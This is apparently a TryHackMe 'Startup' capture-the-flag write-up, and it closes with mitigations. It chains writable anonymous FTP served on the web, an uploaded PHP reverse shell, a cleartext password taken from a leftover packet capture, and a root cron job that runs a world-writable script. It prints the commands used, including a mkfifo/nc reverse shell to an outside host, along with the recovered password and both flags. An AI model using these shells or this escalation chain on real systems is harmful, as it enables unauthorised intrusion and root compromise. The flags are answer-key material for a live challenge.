# THM — Startup

```
███████╗████████╗ █████╗ ██████╗ ████████╗██╗   ██╗██████╗ 
██╔════╝╚══██╔══╝██╔══██╗██╔══██╗╚══██╔══╝██║   ██║██╔══██╗
███████╗   ██║   ███████║██████╔╝   ██║   ██║   ██║██████╔╝
╚════██║   ██║   ██╔══██║██╔══██╗   ██║   ██║   ██║██╔═══╝ 
███████║   ██║   ██║  ██║██║  ██║   ██║   ╚██████╔╝██║     
╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝     
                       TryHackMe — Easy
```

---

## Table of Contents

- [Progress Checklist](#progress-checklist)
- [Tools Used](#tools-used)
- [TL;DR](#tldr)
- [Introduction](#introduction)
- [Recon](#recon)
- [Foothold](#foothold)
- [Shell / Initial Access](#shell--initial-access)
- [Escalation Path](#escalation-path)
- [Exploitation](#exploitation)
- [Rabbit Holes](#rabbit-holes)
- [Flag](#flag)
- [Mitigations](#mitigations)
- [Key Takeaway](#key-takeaway)
- [If I Did It Again](#if-i-did-it-again)
- [Changelog](#changelog)

---

## Progress Checklist

- [x] Port scan — anonymous-writable FTP (vsftpd 3.0.3), SSH, and an Apache "Maintenance" site
- [x] Logged in to FTP as `anonymous`, pulled `notice.txt` and `important.jpg` (an Among Us meme)
- [x] Found the FTP share is served on the web at `/files/`, and its `ftp/` subfolder is world-writable
- [x] Uploaded a PHP reverse shell over FTP and ran it from `/files/ftp/` → shell as `www-data`
- [x] Found `/incidents/suspicious.pcapng`, exfiltrated it, and followed the TCP stream to `lennie`'s password
- [x] `su lennie` → read **user flag**
- [x] Found a root-run `planner.sh` that executes a world-writable `/etc/print.sh`
- [x] Wrote a reverse shell into `/etc/print.sh`, waited for the root job → shell as **root**, read **root flag**

---

## Tools Used

| Tool | Purpose |
|---|---|
| RustScan / Nmap | Port and service discovery |
| ftp | Anonymous login, pulling files and uploading the shell |
| feroxbuster | Finding `/files/` and confirming the FTP folder is web-served |
| whatweb | Fingerprinting the web server |
| php-reverse-shell | The payload dropped via FTP and triggered over HTTP |
| nc | Catching the reverse shells |
| python (pty) | Upgrading the dumb shell to a real TTY |
| Wireshark | Following the TCP stream in the capture to recover a password |
| nano | Editing the root-run script for privesc |

---

## TL;DR

Anonymous FTP allows writes, and the same folder is published on the web at
`/files/ftp/`, so a PHP reverse shell uploaded over FTP runs with one click in the
browser and lands a `www-data` shell. A leftover packet capture in `/incidents/`
contains `lennie`'s password in cleartext (recovered by following the TCP stream),
which gives the user flag over `su`. For root, a script in `lennie`'s home,
`planner.sh`, is executed on a schedule by root and in turn runs `/etc/print.sh`,
which is world-writable. Dropping a reverse shell into `/etc/print.sh` and waiting
for the job returns a root shell.

---

## Introduction

Startup is an easy Linux box whose whole theme is "trusting files you shouldn't".
The interesting bit isn't a CVE, it's the chain of trust: anonymous FTP that's also
your webroot, a password sitting in a packet capture someone left on disk, and a
root cron job that executes a file anyone can write. None of these is exotic on its
own. Put them in a line and you walk from unauthenticated to root.

## Recon

RustScan into an Nmap service scan:

```bash
rustscan -a 10.48.177.140 -r 1-65535 --ulimit 5000 -- -Pn -sC -sV
```

```
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534  65534  4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0      0    251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0      0       208 Nov 12  2020 notice.txt
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Maintenance
```

Nmap does most of the work for us here: anonymous FTP is open and, more importantly,
the `ftp` directory is flagged **writeable**. The web server just says "Maintenance".

A content scan of port 80 shows the FTP contents are mirrored on the web:

```bash
feroxbuster -u http://10.48.177.140/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -x php,xt,html
```

```
301  http://10.48.177.140/files => /files/
200  http://10.48.177.140/files/notice.txt
200  http://10.48.177.140/files/important.jpg
```

So `/files/` is the FTP root, and the writable `ftp/` folder is reachable at
`/files/ftp/`. That is the whole foothold in one observation.

## Foothold

Logging in anonymously and reading the files first:

```bash
ftp 10.48.177.140
# Name: anonymous  (blank password)
ftp> get notice.txt
ftp> get important.jpg
```

```
$ cat notice.txt
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY ... Maya is looking pretty sus.
```

`important.jpg` is, as promised, an Among Us meme. No stego rabbit hole needed; the
real gift is that the folder is writable and web-served.

## Shell / Initial Access

Upload a PHP reverse shell over FTP into the writable `ftp/` directory:

```bash
ftp 10.48.177.140
ftp> cd ftp
ftp> put php-reverse-shell.php
```

Start a listener, then trigger it in the browser at
`http://10.48.177.140/files/ftp/php-reverse-shell.php`:

```bash
nc -lnvp 4444
```

```
connect to [192.168.134.217] from (UNKNOWN) [10.48.177.140]
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ python -c 'import pty; pty.spawn("/bin/bash")'
```

We land as `www-data`. `/home/lennie` exists but is not readable yet, and the root
of the filesystem has two things worth a look: `recipe.txt` (flavour text) and an
`incidents/` folder.

```
www-data@startup:/$ ls /incidents
suspicious.pcapng
```

A packet capture sitting on a web server is never there by accident. Exfiltrate it:

```bash
www-data@startup:/incidents$ python3 -m http.server 8755
# then download http://10.48.177.140:8755/suspicious.pcapng
```

Open it in Wireshark, right-click an entry and **Follow > TCP Stream**. The stream
contains `lennie`'s password in cleartext:

```
c4ntg3t3n0ughsp1c3
```

Switch to that user:

```bash
www-data@startup:/$ su lennie
Password: c4ntg3t3n0ughsp1c3
lennie@startup:~$ cat user.txt
THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
```

## Escalation Path

`sudo -l` is a dead end — `lennie may not run sudo`. So look at what `lennie` owns
and what runs on a timer. In `~/scripts`:

```bash
lennie@startup:~/scripts$ cat planner.sh
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```

```bash
lennie@startup:~/scripts$ ls -lah
-rwxr-xr-x 1 root root   77 Nov 12  2020 planner.sh
-rw-r--r-- 1 root root    1 Jun 21 21:57 startup_list.txt
```

`planner.sh` is owned by root, and `startup_list.txt` keeps getting rewritten with a
fresh timestamp — something runs this on a schedule as root. And `planner.sh` calls
`/etc/print.sh`:

```bash
lennie@startup:~/scripts$ cat /etc/print.sh
#!/bin/bash
echo "Done!"
```

Check who can write it:

```bash
lennie@startup:~/scripts$ ls -l /etc/print.sh
# writable by lennie
```

`/etc/print.sh` is editable by us and executed by a root job. That's the vector.

## Exploitation

Edit `/etc/print.sh` and append a reverse shell (keeping the original `echo` so the
job still looks normal):

```bash
lennie@startup:~/scripts$ export TERM=xterm-256color   # nano needs a real terminal
lennie@startup:~/scripts$ nano /etc/print.sh
```

```bash
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.134.217 4445 >/tmp/f
echo "Done!"
```

Start the listener and wait for the scheduled root run:

```bash
nc -lnvp 4445
```

```
connect to [192.168.134.217] from (UNKNOWN) [10.48.177.140]
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
THM{f963aaa6a430f210222158ae15c3d76d}
```

Running `bash planner.sh` by hand only runs `print.sh` as `lennie` (and errors on
the root-owned `startup_list.txt`), so the root shell comes from the scheduled job,
not from running it yourself. Patience, not force.

## Rabbit Holes

- Tried `cd lennie` from `/` and got "No such file or directory", then `cd /home/lennie`
  gave "Permission denied" as `www-data`. The home only opens up after becoming `lennie`.
- `nano /etc/print.sh` kept failing with "Error opening terminal: unknown" until the
  shell was upgraded (`python3 -c 'import pty...'`, `stty raw -echo; fg`, then
  `export TERM=xterm-256color`). A dumb reverse shell can't run a full-screen editor.
- `important.jpg` looks like a stego invitation. It isn't; it's a meme. The writable
  web-served FTP folder is the actual path.

## Flag

| Flag | Value |
|---|---|
| User | `THM{03ce3d619b80ccbfb3b7fc81e46c0e79}` |
| Root | `THM{f963aaa6a430f210222158ae15c3d76d}` |

## Mitigations

- **Anonymous, writable FTP mapped to the webroot:** never allow anonymous writes,
  and never serve an upload directory as executable web content. Either of those
  alone kills the foothold; together they are remote code execution for anyone.
- **Secrets in a packet capture on disk:** don't leave captures on production hosts,
  and don't send credentials over cleartext protocols that end up in them. If a
  capture must exist, it shouldn't be readable by the web user.
- **World-writable script run by root:** a scheduled root job must only execute files
  that root owns and only root can write. `chown root:root` and `chmod 755` (or
  tighter) on `/etc/print.sh`, and the privesc is gone.

## Key Takeaway

Chained trust is the lesson: a writable FTP folder is minor, a readable capture is
minor, a writable script is minor. The engagement value is spotting that each one
feeds the next. Also, "something keeps rewriting this file on a timer" is one of the
most reliable privesc tells on Linux — always check what owns the scheduled thing
and what it executes.

## If I Did It Again

I'd check whether the FTP root was web-served *before* downloading anything, since
that single fact is the whole foothold. And I'd upgrade the shell to a full TTY
immediately after catching it, instead of hitting the nano terminal error first.

## Changelog

| Version | Date | Notes |
|---|---|---|
| 1.0 | 2026-11-23 | First writeup from my notes. |

[Back to top](#thm--startup)
